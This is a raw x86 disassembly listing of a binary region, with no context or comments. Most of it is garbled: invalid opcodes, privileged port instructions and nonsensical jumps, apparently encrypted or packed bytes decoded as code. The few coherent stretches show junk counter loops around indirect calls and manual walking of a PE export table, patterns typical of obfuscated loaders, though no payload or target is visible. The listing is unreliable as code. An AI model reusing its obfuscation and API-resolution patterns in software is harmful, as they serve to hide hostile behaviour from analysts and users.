  4140a5:	shr    DWORD PTR [esi+ebx*2-0x80],cl
  4140a9:	dec    edi
  4140aa:	les    edx,FWORD PTR [eax-0x3d]
  4140ad:	inc    ebx
  4140ae:	loope  0x414119
  4140b0:	out    dx,eax
  4140b1:	icebp  
  4140b2:	inc    eax
  4140b3:	mov    ch,ch
  4140b5:	dec    esp
  4140b6:	(bad)  
  4140b7:	sti    
  4140b8:	sbb    DWORD PTR [edx+0x44ec74e0],edi
  4140be:	test   eax,0x5500a868
  4140c3:	xor    ebx,DWORD PTR [esi+0x65460af8]
  4140c9:	adc    DWORD PTR [eax+eiz*8+0x41],esi
  4140cd:	pop    ecx
  4140ce:	xchg   ebp,eax
  4140cf:	xchg   edi,eax
  4140d0:	pop    edx
  4140d1:	mul    edx
  4140d3:	nop
  4140d4:	xchg   ebx,ecx
  4140d6:	add    esi,esp
  4140d8:	mov    WORD PTR [ebx+0x1ec2dd70],cs
  4140de:	mov    edx,0x7633ebe7
  4140e3:	mov    ebx,0x4e5b875
  4140e8:	push   0x40d06b1e
  4140ed:	push   0xffffffe8
  4140ef:	test   dh,bl
  4140f1:	bound  edi,QWORD PTR [edi-0x4d7067c5]
  4140f7:	push   0x3d8f74e7
  4140fc:	leave  
  4140fd:	inc    eax
  4140fe:	stos   BYTE PTR es:[edi],al
  4140ff:	pop    ds
  414100:	sub    BYTE PTR cs:[eax+edx*2],ch
  414104:	xchg   esp,eax
  414105:	dec    ebp
  414106:	jo     0x4140b7
  414108:	cmp    al,0x62
  41410a:	test   eax,0x27162755
  41410f:	(bad)  
  414111:	data16 loope 0x41416a
  414114:	adc    eax,0x984d0008
  414119:	jmp    0xe423:0xc86d449b
  414120:	pop    esp
  414121:	jmp    FWORD PTR [ebp-0x73]
  414124:	loop   0x4140f3
  414126:	push   eax
  414127:	mov    ss,WORD PTR [ecx]
  414129:	mov    cs,edx
  41412b:	aaa    
  41412c:	jno    0x414174
  41412e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41412f:	hlt    
  414130:	hlt    
  414131:	les    esp,FWORD PTR [eax]
  414133:	mov    esp,0xd5c0ae13
  414138:	rcr    DWORD PTR [esi],cl
  41413a:	(bad)  
  41413b:	sbb    eax,0xf6ab3daa
  414140:	out    0x6d,eax
  414142:	push   0xffffff92
  414144:	sbb    eax,0xce58a053
  414149:	or     ebx,edi
  41414b:	ins    DWORD PTR es:[edi],dx
  41414c:	icebp  
  41414d:	jnp    0x41410b
  41414f:	mov    WORD PTR [edx+0x57c5a629],cs
  414155:	inc    edx
  414156:	pop    edi
  414157:	jecxz  0x4141bc
  414159:	ins    BYTE PTR es:[edi],dx
  41415a:	mov    edx,DWORD PTR [ebp+0x458b9c99]
  414160:	in     al,dx
  414161:	and    DWORD PTR ds:0x42fcd5,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fcd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fcd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fcd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e56f
  41418b:	cmp    DWORD PTR ds:0x42fcd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fcd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e6ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fce9
  4141ba:	sbb    DWORD PTR ds:0x42fcd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd05,0x42e713
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e6eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e70f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fcdd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fcdd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fcdd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fcdd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e573
  41423b:	cmp    DWORD PTR ds:0x42fcdd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fcdd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fcdd,ecx
  414257:	cmp    DWORD PTR ds:0x42fcdd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x414250
  414283:	jne    0x414276
  414285:	mov    al,BYTE PTR [eax-0x468f8f8d]
  41428b:	jle    0x4142fd
  41428d:	jo     0x414283
  41428f:	test   BYTE PTR [edx-0x25e97ed9],0xd6
  414296:	fcomi  st,st(6)
  414298:	mov    fs,WORD PTR [ebx-0x24293477]
  41429e:	cli    
  41429f:	add    al,BYTE PTR ds:0x89b1ce31
  4142a5:	imul   ebp,DWORD PTR [edx-0x33795a33],0x8
  4142ac:	push   esp
  4142ad:	outs   dx,DWORD PTR ds:[esi]
  4142ae:	clc    
  4142af:	xchg   edx,eax
  4142b0:	loope  0x41425d
  4142b2:	mov    ds:0xd0aa51df,eax
  4142b7:	out    dx,al
  4142b8:	outs   dx,BYTE PTR ds:[esi]
  4142b9:	dec    ebp
  4142ba:	fnsave [eax+0x77]
  4142bd:	xor    DWORD PTR [esi+0xb],edi
  4142c0:	mov    al,ds:0x427d47dc
  4142c5:	inc    esp
  4142c6:	lods   eax,DWORD PTR ds:[esi]
  4142c7:	pushw  cs
  4142c9:	shl    DWORD PTR [edi-0x41],1
  4142cc:	cmp    bl,BYTE PTR [edx-0x44]
  4142cf:	dec    esp
  4142d0:	or     edx,DWORD PTR [ebx]
  4142d2:	add    DWORD PTR [eax+0x45],edx
  4142d5:	loope  0x414331
  4142d7:	test   al,0x30
  4142d9:	cmp    eax,0xc1d88138
  4142de:	cmp    BYTE PTR [eax+edx*1-0x3c543979],0xd5
  4142e6:	sub    eax,0x6279816a
  4142eb:	sti    
  4142ec:	sub    eax,edi
  4142ee:	push   cs
  4142ef:	sub    ebx,DWORD PTR [ebx]
  4142f1:	imul   ecx,DWORD PTR [edx],0x48435460
  4142f7:	mov    al,ds:0x50a11ee8
  4142fc:	inc    edi
  4142fd:	pop    esi
  4142fe:	cmp    eax,0x595a43cd
  414303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414304:	cmp    eax,0xf6f2e608
  414309:	push   ds
  41430a:	dec    ebp
  41430b:	mov    ah,0x1e
  41430d:	rcl    BYTE PTR [ecx],1
  41430f:	and    al,0x67
  414311:	fld    TBYTE PTR [esi]
  414313:	aaa    
  414314:	rcl    eax,0xc
  414317:	push   edx
  414318:	jmp    0xfec2:0x46642008
  41431f:	and    dh,BYTE PTR [edx+edi*8]
  414322:	or     esi,0x79f614d3
  414328:	out    dx,al
  414329:	jns    0x414394
  41432b:	sbb    eax,0xe30ec874
  414330:	pop    ebp
  414331:	pop    ecx
  414332:	ss arpl cx,bp
  414335:	inc    eax
  414336:	adc    al,BYTE PTR [edx+esi*4+0x4e]
  41433a:	frstor [ebp-0x3c]
  41433d:	pop    esi
  41433e:	das    
  41433f:	add    eax,0xc6f7cfc6
  414344:	mov    al,0xe3
  414346:	sub    ch,BYTE PTR [esi+0x32]
  414349:	pop    edx
  41434a:	fidiv  WORD PTR [edx]
  41434c:	xchg   ebx,eax
  41434d:	std    
  41434e:	inc    ebx
  41434f:	(bad)  
  414350:	dec    esp
  414351:	pop    edi
  414352:	or     eax,0xe0bd2c2b
  414357:	dec    edx
  414358:	mov    DWORD PTR [eax-0x6],eax
  41435b:	into   
  41435c:	mov    ds:0x3f3bd3cc,eax
  414361:	dec    ebp
  414362:	data16 fs aam 0xe4
  414366:	lods   al,BYTE PTR ds:[esi]
  414367:	sti    
  414368:	xor    al,0x8c
  41436a:	gs inc eax
  41436c:	jmp    0x414399
  41436e:	and    DWORD PTR [ecx],ecx
  414370:	mov    DWORD PTR ds:[ebp*1+0x44bc52f8],edi
  414378:	mov    ebp,0xef5ee25e
  41437d:	push   esp
  41437e:	loop   0x41435c
  414380:	cmp    BYTE PTR [edx+0x1a],bl
  414383:	add    eax,0xeb6e2ef7
  414388:	rcl    bl,1
  41438a:	push   ss
  41438b:	pop    ecx
  41438c:	cmp    BYTE PTR [ebx+0x7bff7ce2],0x8f
  414393:	arpl   WORD PTR [edx+0x6a],bp
  414396:	sub    al,0x3a
  414398:	das    
  414399:	xchg   edx,eax
  41439a:	call   0x8ec0bb74
  41439f:	or     ch,bl
  4143a1:	pop    ebp
  4143a2:	sbb    al,0x93
  4143a4:	sbb    bl,BYTE PTR [esi-0xc]
  4143a7:	fbld   TBYTE PTR [eax+0x6bc27637]
  4143ad:	ds je  0x414409
  4143b0:	inc    ebx
  4143b1:	push   eax
  4143b2:	sbb    DWORD PTR [ebx],ebx
  4143b4:	sbb    edi,ebp
  4143b6:	popa   
  4143b7:	loope  0x414413
  4143b9:	xor    al,0x8f
  4143bb:	push   esi
  4143bc:	pop    ecx
  4143bd:	in     eax,dx
  4143be:	sub    BYTE PTR ds:0xf3086dd5,bh
  4143c4:	xchg   edi,eax
  4143c5:	in     al,dx
  4143c6:	adc    eax,0xe57d754
  4143cb:	jnp    0x41435a
  4143cd:	outs   dx,DWORD PTR ds:[esi]
  4143ce:	cmp    al,0x8d
  4143d0:	jmp    0xfd31:0xa7572c51
  4143d7:	pop    ecx
  4143d8:	test   BYTE PTR [ecx*8+0x51d50fbd],0xc5
  4143e0:	xchg   ebp,eax
  4143e1:	(bad)  
  4143e2:	in     eax,0xc1
  4143e4:	popa   
  4143e5:	ss (bad) 
  4143e7:	aad    0x5b
  4143e9:	xchg   edi,eax
  4143ea:	int3   
  4143eb:	dec    eax
  4143ec:	test   eax,0x51d05446
  4143f1:	sub    al,0x82
  4143f3:	fisub  WORD PTR [edi]
  4143f5:	xor    eax,0xf4f09b03
  4143fa:	fs jnp 0x41438f
  4143fd:	popf   
  4143fe:	pop    ebx
  4143ff:	mov    WORD PTR [eax-0x1dee4a80],ss
  414405:	add    al,0x9a
  414407:	pop    ds
  414408:	ror    BYTE PTR [esp+ecx*1],cl
  41440b:	or     ebx,DWORD PTR [ebp+0x67ff7905]
  414411:	and    edi,esi
  414413:	cmp    ecx,0xffffffae
  414416:	jnp    0x41444c
  414418:	dec    ecx
  414419:	cmp    DWORD PTR [eax],0xffffffda
  41441c:	rcr    DWORD PTR [edx-0x71],cl
  41441f:	stos   DWORD PTR es:[edi],eax
  414420:	push   ecx
  414421:	add    al,0xd6
  414423:	lahf   
  414424:	mov    ch,0x1f
  414426:	mov    ebp,0xb9b72547
  41442b:	inc    eax
  41442c:	cmc    
  41442d:	xchg   ebx,eax
  41442e:	sbb    eax,0xec241978
  414433:	call   0x2f2aa8c3
  414438:	sar    ch,cl
  41443a:	lea    esp,[esi+0x72deaff7]
  414440:	pop    edi
  414441:	xor    bl,al
  414443:	in     eax,0x1e
  414445:	shl    BYTE PTR [ecx-0x49],cl
  414448:	xchg   edx,eax
  414449:	outs   dx,DWORD PTR ds:[esi]
  41444a:	cld    
  41444b:	je     0x41448b
  41444d:	or     al,0xe
  41444f:	repz dec ebp
  414451:	(bad)  
  414452:	sti    
  414453:	mov    DWORD PTR [edi-0x42],ebx
  414456:	mov    eax,ds:0xf7c22474
  41445b:	mov    edi,0xe23d3bb
  414460:	mov    gs,edi
  414462:	ficomp WORD PTR [eax-0x52a5b26a]
  414468:	cmp    eax,0x59d40627
  41446d:	shl    ecx,1
  41446f:	xchg   ebp,eax
  414470:	or     eax,0x581a43e9
  414475:	inc    eax
  414476:	or     eax,0xbec9c3d8
  41447b:	or     bl,BYTE PTR [edx]
  41447d:	ja     0x4144e7
  41447f:	fwait
  414480:	test   ecx,ecx
  414482:	ins    DWORD PTR es:[edi],dx
  414483:	adc    dh,BYTE PTR [eax-0x2d058e4a]
  414489:	inc    edi
  41448a:	push   0x1d
  41448c:	mov    ebx,edi
  41448e:	out    0x94,eax
  414490:	fiadd  WORD PTR [ecx+0xce4064d]
  414496:	mov    cs,WORD PTR [edx-0x4d427ea3]
  41449c:	ret    0x61b
  41449f:	mov    cs,WORD PTR [edi+0x35a76df4]
  4144a5:	jne    0x41447f
  4144a7:	and    eax,0x1c3de75d
  4144ac:	mov    edi,0x57544020
  4144b1:	das    
  4144b2:	iret   
  4144b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144b4:	mov    bl,0x80
  4144b6:	cdq    
  4144b7:	arpl   ax,bp
  4144b9:	xor    DWORD PTR [ecx],ebx
  4144bb:	aaa    
  4144bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144bd:	cmp    esp,eax
  4144bf:	lahf   
  4144c0:	fistp  WORD PTR [eax+0x6b]
  4144c3:	scas   eax,DWORD PTR es:[edi]
  4144c4:	jg     0x4144a6
  4144c6:	xacquire xchg DWORD PTR [ebp+0x52],eax
  4144ca:	imul   ebx,DWORD PTR [ebp-0x367649c9],0xfffffff5
  4144d1:	adc    ecx,DWORD PTR [eax]
  4144d3:	adc    ebx,ecx
  4144d5:	repnz and ebx,ebp
  4144d8:	jo     0x414462
  4144da:	bound  esp,QWORD PTR [ecx]
  4144dc:	cmp    ecx,eax
  4144de:	dec    ebx
  4144df:	push   edx
  4144e0:	jno    0x4144bf
  4144e2:	xchg   ecx,eax
  4144e3:	cld    
  4144e4:	retf   0x2f35
  4144e7:	fidiv  WORD PTR [edx-0x3b674ebb]
  4144ed:	loopne 0x414470
  4144ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144f0:	jbe    0x4144d3
  4144f2:	dec    esp
  4144f3:	scas   eax,DWORD PTR es:[edi]
  4144f4:	int    0x53
  4144f6:	leave  
  4144f7:	cmp    DWORD PTR [ecx+0x14112efb],esp
  4144fd:	xor    ch,ah
  4144ff:	mov    WORD PTR [ebp+0x3e0af4a4],ds
  414505:	mov    esp,0xa591b62b
  41450a:	data16 into 
  41450c:	sub    DWORD PTR [eax],0xffffffa1
  41450f:	sbb    al,0x12
  414511:	mov    dh,BYTE PTR [ebx-0x52]
  414514:	jb     0x41455e
  414516:	push   edi
  414517:	push   es
  414518:	pushf  
  414519:	mov    edx,0x852be600
  41451e:	jle    0x414586
  414520:	jl     0x414534
  414522:	lods   eax,DWORD PTR ds:[esi]
  414523:	jae    0x4144d5
  414525:	scas   eax,DWORD PTR es:[edi]
  414526:	mov    dl,0xac
  414528:	jb     0x41455b
  41452a:	pop    ds
  41452b:	popf   
  41452c:	mov    cl,0x4c
  41452e:	into   
  41452f:	xor    al,0x93
  414531:	loopne 0x4144cc
  414533:	into   
  414534:	mov    edi,0x70663846
  414539:	push   esp
  41453a:	push   es
  41453b:	adc    ax,0xccaa
  41453f:	dec    ecx
  414540:	ins    DWORD PTR es:[edi],dx
  414541:	lods   eax,DWORD PTR ds:[esi]
  414542:	pop    ebx
  414543:	int    0x69
  414545:	(bad)  
  414546:	lods   eax,DWORD PTR ds:[esi]
  414547:	in     eax,dx
  414548:	add    edx,DWORD PTR [edi+0x7d]
  41454b:	push   es
  41454c:	sub    bh,al
  41454e:	call   0xb77b1f18
  414553:	pop    ss
  414554:	out    0xff,eax
  414556:	jne    0x414528
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0xae13beb4
  414576:	neg    BYTE PTR [edi+0x707f70c9]
  41457c:	mov    ecx,0x9870707e
  414581:	jnp    0x41453b
  414583:	int3   
  414584:	jmp    DWORD PTR [eax]
  414586:	cmp    DWORD PTR [esi+0x233ad188],edx
  41458c:	push   ecx
  41458d:	push   edx
  41458e:	scas   al,BYTE PTR es:[edi]
  41458f:	adc    edi,ecx
  414591:	bswap  esi
  414593:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414594:	fst    QWORD PTR [ebx+ebx*8]
  414597:	not    BYTE PTR [edi]
  414599:	jne    0x4145ee
  41459b:	push   eax
  41459c:	xchg   ebx,eax
  41459d:	hlt    
  41459e:	jp     0x4145e9
  4145a0:	and    BYTE PTR [edi],bl
  4145a2:	push   ecx
  4145a3:	push   ecx
  4145a4:	jle    0x4145a2
  4145a6:	test   dh,0x86
  4145a9:	dec    ebx
  4145aa:	adc    edx,0xffffffeb
  4145ad:	shl    esp,cl
  4145af:	adc    al,0xac
  4145b1:	dec    ebx
  4145b2:	push   esi
  4145b3:	ins    DWORD PTR es:[edi],dx
  4145b4:	add    eax,0x4add2947
  4145b9:	xchg   ecx,eax
  4145ba:	xor    DWORD PTR [ebp+0x6c375552],ebx
  4145c0:	test   DWORD PTR [ecx+ebx*1],eax
  4145c3:	ret    0xfa71
  4145c6:	mov    al,ds:0xdf5065c6
  4145cb:	sub    DWORD PTR [ebp+0x1ef882b7],0xffffffb5
  4145d2:	pusha  
  4145d3:	jns    0x4145e8
  4145d5:	mov    al,ds:0xe1c4a056
  4145da:	mov    esi,0xbaac4b85
  4145df:	xchg   ebp,eax
  4145e0:	mov    edi,0xd5c2de84
  4145e5:	pusha  
  4145e6:	sar    BYTE PTR [edx],0xb6
  4145e9:	push   0x8f9432de
  4145ee:	sahf   
  4145ef:	jl     0x4145b7
  4145f1:	pop    esp
  4145f2:	into   
  4145f3:	xor    al,0xdf
  4145f5:	sar    BYTE PTR [eax],1
  4145f7:	mov    DWORD PTR [edi-0x14],edi
  4145fa:	call   0x5cee12f0
  4145ff:	std    
  414600:	cmp    DWORD PTR [ebx+0x18],esi
  414603:	xchg   edx,eax
  414604:	cmp    eax,0xfe283ba9
  414609:	lea    esi,[eax-0x76]
  41460c:	imul   edx,DWORD PTR [ebp+eiz*2+0x2c62f4bc],0xffffff9b
  414614:	nop
  414615:	mov    esp,0xcd7a5a5b
  41461a:	scas   al,BYTE PTR es:[edi]
  41461b:	ret    
  41461c:	clc    
  41461d:	outs   dx,DWORD PTR ds:[esi]
  41461e:	rcl    eax,cl
  414620:	push   ecx
  414621:	mov    edx,0xa4426a6d
  414626:	iret   
  414627:	outs   dx,BYTE PTR ds:[esi]
  414628:	mov    ecx,0x3a029044
  41462d:	aas    
  41462e:	loopne 0x4145b4
  414630:	xchg   edx,eax
  414631:	and    BYTE PTR [ebp+edi*4-0x1c],ch
  414635:	lods   eax,DWORD PTR ds:[esi]
  414636:	int3   
  414637:	imul   esp,DWORD PTR [esi+ecx*1],0xabcf9bb0
  41463e:	xchg   edi,eax
  41463f:	mov    ecx,0xa482982
  414644:	cmp    DWORD PTR [ebp-0x59],0x4b019e22
  41464b:	dec    ecx
  41464c:	mov    bh,0x2e
  41464e:	pop    ecx
  41464f:	sub    ecx,edx
  414651:	jnp    0x4145f1
  414653:	clc    
  414654:	pop    esp
  414655:	cli    
  414656:	xor    eax,esp
  414658:	xchg   ecx,eax
  414659:	mov    esi,ebx
  41465b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41465c:	mov    eax,ds:0x75bb38a9
  414661:	jb     0x414650
  414663:	xor    eax,0x99f10b4b
  414668:	inc    eax
  414669:	inc    esi
  41466a:	add    BYTE PTR [edi],dl
  41466c:	(bad)  
  41466d:	div    BYTE PTR [edi]
  41466f:	loopne 0x4145f5
  414671:	push   edx
  414672:	aas    
  414673:	repnz xchg esp,eax
  414675:	lahf   
  414676:	mov    ecx,0xacf8b815
  41467b:	add    eax,0x9fc5d82c
  414680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414681:	lds    ebx,FWORD PTR [esi-0x38]
  414684:	dec    ebx
  414685:	mov    es,WORD PTR [esi+0x3f]
  414688:	test   DWORD PTR ds:0x50083a63,0x21df496
  414692:	hlt    
  414693:	xor    al,dh
  414695:	xchg   esp,eax
  414696:	mov    DWORD PTR [edx-0x5e3e9d65],0xd643c9ee
  4146a0:	jg     0x414658
  4146a2:	(bad)  [esi+0x3f]
  4146a5:	push   eax
  4146a6:	lea    ebx,[ebp+edx*2-0x52be3cd9]
  4146ad:	push   ecx
  4146ae:	adc    DWORD PTR [eax+0x0],edx
  4146b1:	int    0xe8
  4146b3:	or     bh,BYTE PTR [eax-0xdb44c6f]
  4146b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146ba:	arpl   WORD PTR [esi],ax
  4146bc:	dec    esp
  4146bd:	sbb    al,0x3e
  4146bf:	push   eax
  4146c0:	dec    eax
  4146c1:	dec    esi
  4146c2:	push   eax
  4146c3:	jbe    0x414691
  4146c5:	aaa    
  4146c6:	mov    ch,0xf3
  4146c8:	ins    BYTE PTR es:[edi],dx
  4146c9:	(bad)  
  4146ca:	pop    ss
  4146cb:	ret    0xee12
  4146ce:	mov    edx,0x9b4df26e
  4146d3:	inc    ecx
  4146d4:	mov    esp,0x9043cce6
  4146d9:	dec    ecx
  4146da:	jb     0x414707
  4146dc:	mov    esp,es
  4146de:	sbb    BYTE PTR [edi+0x47],0x86
  4146e2:	xchg   ebx,eax
  4146e3:	push   es
  4146e4:	pop    ss
  4146e5:	test   DWORD PTR [ebx],edi
  4146e7:	pop    esp
  4146e8:	inc    edi
  4146e9:	mov    DWORD PTR [esi-0x4febd47e],eax
  4146ef:	push   esp
  4146f0:	aam    0x42
  4146f2:	mov    DWORD PTR [edx],eax
  4146f4:	cs xor eax,0xfa790af9
  4146fa:	and    eax,0xcbd5be61
  4146ff:	cdq    
  414700:	sub    ch,bl
  414702:	repnz mov ebp,0x1484b1
  414708:	in     eax,0x4d
  41470a:	or     ch,BYTE PTR [edi+ebx*1]
  41470d:	imul   edx,DWORD PTR [eax+0x1e],0xb7766515
  414714:	and    BYTE PTR [ebx],dl
  414716:	icebp  
  414717:	retf   
  414718:	push   ebp
  414719:	scas   eax,DWORD PTR es:[edi]
  41471a:	popa   
  41471b:	retf   
  41471c:	sub    al,0xfb
  41471e:	das    
  41471f:	in     al,0x63
  414721:	mov    bl,0xe4
  414723:	pop    esi
  414724:	dec    edx
  414725:	or     edi,DWORD PTR [ecx]
  414727:	js     0x41475c
  414729:	retf   0xab92
  41472c:	gs retf 
  41472e:	add    DWORD PTR [ebp-0x57],edx
  414731:	xor    DWORD PTR [esp+eax*8],ebx
  414734:	sub    cl,0x9d
  414737:	fisubr DWORD PTR [edi-0x10]
  41473a:	xchg   BYTE PTR [edx],cl
  41473c:	lea    edi,[edi-0x18]
  41473f:	loopne 0x41475a
  414741:	mov    al,ds:0xd702097f
  414746:	mov    DWORD PTR [eax],eax
  414748:	icebp  
  414749:	jnp    0x414742
  41474b:	mov    ebp,0xf5e88f6a
  414750:	mov    WORD PTR ds:0x39e3854b,cs
  414756:	iret   
  414757:	ret    0xd48a
  41475a:	and    al,0x91
  41475c:	pop    edx
  41475d:	neg    BYTE PTR [ecx-0x7d2b26e9]
  414763:	mov    ebx,0xd730e816
  414768:	dec    esi
  414769:	(bad)  
  41476a:	in     eax,dx
  41476b:	aaa    
  41476c:	sub    eax,0xfa865e69
  414771:	sbb    DWORD PTR [eax+0x6d92c8f1],edx
  414777:	ss aaa 
  414779:	inc    edx
  41477a:	arpl   WORD PTR [ebx-0x73],si
  41477d:	dec    ecx
  41477e:	adc    DWORD PTR [ecx],edi
  414780:	pop    edi
  414781:	jmp    0x4a54:0x95ba7661
  414788:	add    DWORD PTR [edi+0x212d8438],edx
  41478e:	mov    dh,0x82
  414790:	aas    
  414791:	call   DWORD PTR [eax+0x4b]
  414794:	sar    esi,cl
  414796:	fwait
  414797:	xchg   ebp,eax
  414798:	outs   dx,BYTE PTR ds:[esi]
  414799:	ins    BYTE PTR es:[edi],dx
  41479a:	outs   dx,BYTE PTR ds:[esi]
  41479b:	and    cl,ch
  41479d:	xchg   esp,eax
  41479e:	push   cs
  41479f:	xchg   edx,eax
  4147a0:	lds    ecx,FWORD PTR [ecx-0x56]
  4147a3:	out    0x1e,al
  4147a5:	sub    DWORD PTR [esi-0x55],0x538a8f7c
  4147ac:	mov    ah,0x49
  4147ae:	int3   
  4147af:	push   cs
  4147b0:	inc    esi
  4147b1:	fisttp WORD PTR [ebp+edi*1+0x1c]
  4147b5:	imul   ebx,ecx,0x1ac33ff0
  4147bb:	dec    ecx
  4147bc:	push   ss
  4147bd:	test   eax,0xd56cfbed
  4147c2:	mov    fs,edx
  4147c4:	push   es
  4147c5:	loop   0x4147d8
  4147c7:	push   0xfffffff7
  4147c9:	cwde   
  4147ca:	mov    al,0x4
  4147cc:	repz inc esi
  4147ce:	xchg   BYTE PTR [edi+0x326b144],dl
  4147d4:	add    esi,ebp
  4147d6:	(bad)  
  4147d7:	scas   al,BYTE PTR es:[edi]
  4147d8:	repz cwde 
  4147da:	fld    DWORD PTR [ecx-0x42]
  4147dd:	mov    ch,0x17
  4147df:	push   ebx
  4147e0:	lock xor cl,BYTE PTR fs:[ecx-0x64a6101e]
  4147e8:	(bad)  
  4147e9:	ins    BYTE PTR es:[edi],dx
  4147ea:	mov    al,ds:0x2b29f778
  4147ef:	xchg   BYTE PTR [eax-0x4c],al
  4147f2:	or     BYTE PTR [edi+0x65428edf],0xe5
  4147f9:	in     eax,dx
  4147fa:	rcr    BYTE PTR [ebx],0x99
  4147fd:	mov    fs,WORD PTR ds:0xb267cf70
  414803:	daa    
  414804:	push   0xddfbcd1
  414809:	jecxz  0x41481e
  41480b:	fimul  WORD PTR [esi+0x63f64bb1]
  414811:	pop    ebx
  414812:	out    0x11,eax
  414814:	cmp    DWORD PTR [eax+0x29],edi
  414817:	jle    0x4147be
  414819:	jo     0x4147bb
  41481b:	mov    ah,0x3a
  41481d:	push   ds
  41481e:	mov    edi,0x8df510e2
  414823:	sbb    DWORD PTR [ebp-0x49b889ec],edx
  414829:	push   ss
  41482a:	loopne 0x414848
  41482c:	mov    al,ds:0xc30b2591
  414831:	loop   0x414812
  414833:	lahf   
  414834:	xchg   ecx,eax
  414835:	mov    dl,0xb6
  414837:	pop    ss
  414838:	outs   dx,WORD PTR ds:[esi]
  41483a:	ret    
  41483b:	pop    esi
  41483c:	leave  
  41483d:	xchg   ecx,eax
  41483e:	add    al,0xdc
  414840:	mov    BYTE PTR [edi],dh
  414842:	mov    al,0x29
  414844:	xlat   BYTE PTR ds:[ebx]
  414845:	cmp    al,0xbb
  414847:	mov    ecx,DWORD PTR [ebp-0x8]
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x41486d
  414861:	lods   al,BYTE PTR ds:[esi]
  414862:	pop    edx
  414863:	xor    eax,0x707f7d12
  414868:	mov    ecx,0x1f70707e
  41486d:	imul   ebx,edi,0x770017f3
  414873:	xchg   edi,eax
  414874:	mov    esi,0xe542990c
  414879:	inc    edi
  41487a:	ds xchg ebp,eax
  41487c:	jl     0x414819
  41487e:	outs   dx,DWORD PTR ds:[esi]
  41487f:	mov    ebp,0xb3eee08a
  414884:	or     al,0xe2
  414886:	rcl    DWORD PTR [ecx-0x7c0d810b],1
  41488c:	rol    BYTE PTR [ebp+0x60],1
  41488f:	adc    al,0xa3
  414891:	rol    edx,cl
  414893:	or     al,0x89
  414895:	xor    edx,DWORD PTR [ebx+0x13]
  414898:	pop    ecx
  414899:	mov    esi,0x7e92b209
  41489e:	retf   0x36f6
  4148a1:	cs jns 0x414883
  4148a4:	add    eax,0x5eb9db13
  4148a9:	jp     0x414842
  4148ab:	das    
  4148ac:	push   0x6fb4e032
  4148b1:	cmp    ebp,ebp
  4148b3:	jae    0x41491b
  4148b5:	add    DWORD PTR [ebx-0x67],eax
  4148b8:	(bad)  
  4148b9:	repz inc edi
  4148bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148bc:	xor    al,0xe1
  4148be:	jl     0x4148c0
  4148c0:	and    eax,0x89aa64e2
  4148c5:	lea    ebx,[esi]
  4148c7:	test   al,0x99
  4148c9:	mov    bh,0xe7
  4148cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148cc:	mov    bh,0x37
  4148ce:	mov    cs,WORD PTR [eax-0x2e]
